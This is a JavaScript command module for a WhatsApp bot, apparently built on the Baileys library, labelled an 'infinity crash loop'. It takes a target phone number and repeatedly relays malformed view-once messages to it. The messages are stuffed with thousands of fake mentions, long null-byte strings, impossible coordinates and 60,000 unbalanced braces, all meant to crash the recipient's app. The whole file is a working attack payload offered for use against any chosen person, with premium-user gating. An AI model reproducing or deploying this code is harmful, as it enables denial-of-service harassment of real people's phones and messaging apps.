import { isPremiumUser } from '../../utils/premiumStore.js';
export default {
    name: 'ilom-infinity', aliases: ['iinfinity', 'iinf'], category: 'bug',
    description: 'Ilom infinity crash loop', usage: 'ilom-infinity <number>', cooldown: 20, ownerOnly: true,
    async execute({ sock, message, args, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        const num = args[0]?.replace(/[^0-9]/g, ''); if (!num) return sock.sendMessage(from, { text: '❌ Usage: .ilom-infinity <number>' }, { quoted: message });
        const t = `${num}@s.whatsapp.net`;
        await sock.sendMessage(from, { react: { text: '♾️', key: message.key } });
        try {
            for (let i = 0; i < 3; i++) {
                await sock.relayMessage(t, { viewOnceMessage: { message: { listResponseMessage: { title: "💀".repeat(500), listType: 1, singleSelectReply: { selectedRowId: "\u0000".repeat(1000) }, contextInfo: { mentionedJid: Array.from({ length: 3000 }, (_, i) => `dev${i}@s.whatsapp.net`) } } } } }, {});
                await sock.relayMessage(t, { viewOnceMessage: { message: { interactiveMessage: { header: { title: "💥", hasMediaAttachment: false, locationMessage: { degreesLatitude: -999999999, degreesLongitude: 999999999, name: "\u0000".repeat(2000) } }, body: { text: "\u0000".repeat(3000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(60000) } } } } }, {});
            }
            await sock.sendMessage(from, { text: '✅ Infinity sent' }, { quoted: message });
        } catch (e) { await sock.sendMessage(from, { text: '❌ ' + e.message }, { quoted: message }); }
        await sock.sendMessage(from, { react: { text: '✅', key: message.key } });
    }
};
